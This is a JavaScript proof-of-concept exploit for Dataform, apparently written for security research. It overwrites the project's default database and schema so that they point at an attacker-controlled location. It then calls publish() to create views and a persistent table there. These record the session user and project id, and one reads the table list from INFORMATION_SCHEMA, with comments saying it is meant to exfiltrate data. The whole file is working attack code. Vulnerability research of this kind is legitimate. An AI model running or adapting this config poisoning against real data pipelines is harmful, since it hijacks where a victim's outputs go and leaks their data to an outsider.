// =============================================================================
// EXPLOIT: publish() with Poisoned Config Target
// =============================================================================
//
// This demonstrates that publish() called after config poisoning
// will create tables/views in the POISONED location.
//
// Attack scenario:
// 1. Attacker poisons defaultDatabase to point to their dataset
// 2. Attacker calls publish() to create views
// 3. The views are created with the poisoned default location
// 4. When executed, views are created in attacker-controlled location
//
// =============================================================================

// Record config state (may already be poisoned by aaa_operate_exploit.js)
const configState = {
  defaultDatabase: dataform.projectConfig.defaultDatabase,
  defaultSchema: dataform.projectConfig.defaultSchema
};

// Ensure config is poisoned
dataform.projectConfig.defaultDatabase = "shir-research-3";
dataform.projectConfig.defaultSchema = "dataform_poc";

// Create a view that will be placed in the default (poisoned) schema
publish("hijacked_view")
  .query(`
    -- This view demonstrates that publish() uses the current (poisoned) config
    SELECT
      'EXPLOIT_SUCCESS' as status,
      CURRENT_TIMESTAMP() as exploit_time,
      SESSION_USER() as service_account
  `);

// Create a view that exfiltrates data
publish("data_exfil_view")
  .query(`
    -- In a real attack, this would SELECT from victim's sensitive tables
    SELECT
      table_catalog,
      table_schema,
      table_name
    FROM \`shir-research-3.region-us.INFORMATION_SCHEMA.TABLES\`
    LIMIT 100
  `);

// Create a table (not just a view) to persist exfiltrated data
publish("exfil_persist", {
  type: "table"
}).query(`
  -- Create a persistent table with exfiltrated data
  SELECT
    'PERSISTENT_EXFIL' as exploit_type,
    CURRENT_TIMESTAMP() as captured_at,
    SESSION_USER() as service_account,
    @@project_id as project_id
`);

console.log("PUBLISH EXPLOIT COMPILED:", JSON.stringify(configState));
